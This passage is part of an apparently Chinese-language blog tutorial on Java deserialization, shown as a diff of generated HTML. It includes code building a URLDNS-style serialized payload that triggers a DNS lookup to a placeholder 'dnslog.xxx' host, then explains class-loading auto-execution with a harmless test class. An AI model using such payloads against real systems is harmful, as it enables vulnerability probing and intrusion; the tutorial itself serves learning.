class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>	<br>    <span class="hljs-comment">// 借用一点ysoserial的代码，防止在put时造成影响</span><br>    SilentURLStreamHandler silentURLStreamHandler = <span class="hljs-keyword">new</span> SilentURLStreamHandler();<br>    <span class="hljs-comment">// 不重新定义URLStreamHandler类中的openConnection()和InetAddress()方法时，可能会对测试结果造成影响</span><br>    <span class="hljs-comment">// 原因是在解析DNS请求时，能会有缓存，造成第二次请求会优先从缓存中取出</span><br>        <br>    HashMap&lt;Object,Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-keyword">null</span>,<span class="hljs-string">&quot;http://dnslog.xxx&quot;</span>,silentURLStreamHandler);	<span class="hljs-comment">// 填dnslog服务地址</span><br>    ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;C:\\Users\\53433\\Desktop\\tools\\ysoserial\\ser.bin&quot;</span>));<br>    hashMap.put(url,<span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// 使用反射更改hashCode的值</span><br>    Field hashCode = url.getClass().getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>    hashCode.setAccessible(<span class="hljs-keyword">true</span>);<br>    hashCode.setInt(url,-<span class="hljs-number">1</span>);<br>    oos.writeObject(hashMap);<br><br><span class="hljs-comment">//     ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\Users\\53433\\Desktop\\tools\\ysoserial\\ser.bin&quot;));</span><br><span class="hljs-comment">//     ois.readObject();</span><br>    &#125;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">URLStreamHandler</span> </span>&#123;<br><br>        <span class="hljs-function"><span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title">getHostAddress</span><span class="hljs-params">(URL u)</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="方式三"><a href="#方式三" class="headerlink" title="方式三"></a>方式三</h4><p><strong>入口类参数中包含可控类，该类又调用其他有危险方法的类</strong>，<code>readObject()</code>时调用<br>见<a target="_blank" rel="noopener" href="https://mechoy.github.io/2022/11/26/CommonsCollections1/">CC1</a></p>
+<h4 id="方式四"><a href="#方式四" class="headerlink" title="方式四"></a>方式四</h4><p><strong>构造函数/静态代码块等类加载时隐式执行</strong><br><img src="/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" srcset="/img/loading.gif" lazyload><br>这里需要注意的是：类在加载和类初始化的时候，来个测试类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cat</span> </span>&#123;<br>  <span class="hljs-comment">// 静态代码块</span><br>  <span class="hljs-keyword">static</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;静态代码块执行...&quot;</span>);<br>  &#125;<br><br>  &#123;<br>    System.out.println(<span class="hljs-string">&quot;构造代码块执行...&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Integer age = guessAge();<br><br>  <span class="hljs-keyword">public</span> Integer weight = guessWeight();<br><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Integer <span class="hljs-title">guessAge</span><span class="hljs-params">()</span></span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;静态属性加载...&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>+<span class="hljs-number">1</span>;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> Integer <span class="hljs-title">guessWeight</span><span class="hljs-params">()</span></span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;非静态属性加载...&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">12</span>+<span class="hljs-number">12</span>;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Cat</span><span class="hljs-params">()</span> </span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;无参构造器...&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Cat</span><span class="hljs-params">(Integer weight)</span> </span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;有参构造器&quot;</span>);<br>    <span class="hljs-keyword">this</span>.weight = weight;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h5 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h5><h6 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class.forName()"></a>Class.forName()</h6><p><img src="/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png" srcset="/img/loading.gif" lazyload><br>静态代码块和静态属性加载执行<br>试想一下，如果在静态代码块中有一段危险代码，在<code>Class.forName()</code>时就会被执行</p>
+<h6 id="ClassLoader-loadClass"><a href="#ClassLoader-loadClass" class="headerlink" title="ClassLoader.loadClass()"></a>ClassLoader.loadClass()</h6><p><img src="/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png" srcset="/img/loading.gif" lazyload><br>啥都没执行</p>
+<h6 id="new"><a href="#new" class="headerlink" title="new"></a>new</h6><p><img src="/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png" srcset="/img/loading.gif" lazyload><br>啥都执行了，同上，当有一些危险代码在被自动加载的地方，那么就寄</p>
+<h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>其实需要注意的地方，就是一些代码自动执行的地方，例如当重写了<code>readObject()</code>，将自动执行重写后的<code>readObject</code>、代码块的自动执行加载、动态代理类的<code>invoke()</code>等，多注意下自动执行代码的地方</p>
+<h4 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/548242484442524">Java安全漫谈 - 08.认识最简单的Gadget——URLDNS</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16h411z7o9/">Java反序列化漏洞专题-基础篇</a></li>
+</ul>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/">#Java安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java反序列化</div>
+      <div>http://example.com/2023/03/27/Java反序列化/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Mechoy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年3月27日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/03/27/CommonsCollections1/" title="CommonsCollections1">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CommonsCollections1</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="Thymeleaf模板注入">
+                        <span class="hidden-mobile">Thymeleaf模板注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://mechoy.github.io" target="_blank" rel="nofollow noopener"><span>Mechoy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
